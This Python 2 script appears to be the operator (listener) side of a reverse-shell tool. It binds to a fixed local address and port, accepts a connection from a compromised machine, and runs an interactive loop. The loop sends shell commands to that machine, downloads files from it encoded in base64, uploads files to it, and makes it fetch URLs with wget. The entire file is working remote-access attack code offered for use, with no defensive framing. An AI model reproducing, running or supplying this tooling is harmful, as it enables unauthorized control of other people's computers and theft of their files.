#!/usr/bin/python
import socket
import json
import base64
import time

class reverse_shell_server:
    target     = None
    target_ip  = None
    sever_sock = None 
    
    def reliable_send(self, data):
        self.target.send(json.dumps(data))
    
    def reliable_recv(self):
        recv_data = ""
        while True:
            try:
                recv_data = recv_data + self.target.recv(1024)
                return json.loads(recv_data)
            except ValueError,TypeError:
                continue

    def establish_connection(self):
        print "connecting to shell ... "
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("192.168.2.8", 54321))
        sock.listen(5)
        target,ip = sock.accept()
        print "connection established starting shell ..."
        self.target      = target
        self.target_ip   = ip
        self.server_sock = sock
    
    def load_rev_shell(self):
        print "target = ",self.target, "ip = ",self.target_ip
        
        while True:
            prompt       = "reverse_shell:@{}~# ".format(self.target_ip)
            command      = raw_input("reverse_shell:@{}~# ".format(self.target_ip))
            #self.reliable_send(command)
            
            if command == "q" or command == "quit" or command == "exit":
                self.reliable_send(command)
                break

            elif len(command)>0 and command[:2] == "cd":
                cmd_arg_list = command.split(" ")
                command      = cmd_arg_list[0]
                arguments    = cmd_arg_list[1:]
                if len(arguments) > 1:
                    print prompt+"[error]:too many arguments"
                elif len(arguments) == 0:
                    print prompt+"[error] Invalid command"
                else:
                    self.reliable_send(command + " " + arguments[0])
                    print prompt+self.reliable_recv()

            elif len(command)>=8 and command[:8] == "download":
                cmd_arg_list = command.split(" ")
                command      = cmd_arg_list[0]
                arguments    = cmd_arg_list[1:]
                file_list    = arguments
                if len(file_list)>1:
                    for file_name in file_list:
                        if not len(file_name) == 0:
                            self.reliable_send("download "+file_name)
                            with open(file_name, "wb") as downloaded_file:
                                downloaded_file.write(base64.b64decode(self.reliable_recv()))
                        else:
                            print prompt+"error: no file name mentioned"
                else:
                    print prompt+"[error]: Invalid command"
            elif len(command)>=6 and command[:6] == "upload":
                cmd_arg_list = command.split(" ")
                command      = cmd_arg_list[0]
                arguments    = cmd_arg_list[1:]
                file_list    = arguments
                if len(file_list)>1:
                    for file_name in file_list:
                        if not len(file_name) == 0:
                            self.reliable_send("upload "+file_name)
                            time.sleep(2)
                            try:
                                with open(file_name, "rb") as upload_file:
                                    self.reliable_send(base64.b64encode(upload_file.read()))
                                    time.sleep(1)
                                    print prompt+"uploading "+file_name+"..."
                                    time.sleep(1)
                                    print prompt+file_name+" uploaded sucessfully!"
                                time.sleep(1)
                            except:
                                print prompt+"[error]: failed to upload "+file_name
                                self.reliable_send("failed")
                                time.sleep(2)
                        else:
                            print prompt+"[error]: no file name mentioned"
                else:
                    print prompt+"[error]: Invalid command"
            elif command[:4] == "wget":
                cmd_len      = len(command)
                cmd_arg_list = command.split(" ")
                command      = cmd_arg_list[0]
                arguments    = cmd_arg_list[1:]
                if len(arguments) >1:
                    print prompt + "[error]: Invalid command"
                elif len(arguments) ==0:
                    if cmd_len == 4:
                        print prompt + "[error]: missing URL"
                        print "[usage]: wget [URL].."
                    else:
                        print prompt + "[error]: invalid command"
                else:
                    self.reliable_send(command + " " + arguments[0])
                    print prompt + self.reliable_recv()

            else:
                self.reliable_send(command)
                output = self.reliable_recv()
                print prompt+output
    def close_conn(self):
        self.server_sock.close()
                
obj = reverse_shell_server()
obj.establish_connection()
obj.load_rev_shell()
obj.close_conn()

